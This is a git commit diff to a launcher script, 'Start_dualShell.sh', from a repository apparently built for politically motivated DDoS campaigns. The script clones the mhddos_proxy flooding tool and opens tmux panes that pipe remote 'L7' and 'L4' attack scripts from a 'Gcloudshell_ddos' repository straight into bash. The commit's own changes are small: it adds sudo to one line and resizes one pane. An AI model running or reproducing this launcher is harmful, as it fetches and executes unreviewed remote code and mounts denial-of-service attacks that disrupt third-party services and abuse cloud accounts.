99b5beb74156054351881fa70a8aae81288b35f3
Operation-Stop-russia <103530329+Operation-Stop-russia@users.noreply.github.com>
2022-04-18 08:00:26 +0300

    Update Start_dualShell.sh

--- Start_dualShell.sh
+++ Start_dualShell.sh
@@ -4,7 +4,7 @@
 #mkdir dualshell
 #cd dualshell
 
-grep -qxF 'set -g mouse on' ~/.tmux.conf || echo 'set -g mouse on' >> ~/.tmux.conf
+sudo grep -qxF 'set -g mouse on' ~/.tmux.conf || echo 'set -g mouse on' >> ~/.tmux.conf
 tmux source-file ~/.tmux.conf
 
 git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
@@ -15,6 +15,6 @@ cd ~
 echo -e " \v Operation - Stop russia \v  "
 echo -e "For control CPU&RAM usage enter - top\v here"
 sleep 1.5
-tmux split-window -v -p 90 'curl -s https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/L7 | bash'
+tmux split-window -v -p 87 'curl -s https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/L7 | bash'
 sleep 0.1
 tmux split-window -h -p 50 'curl -s https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/L4 | bash'
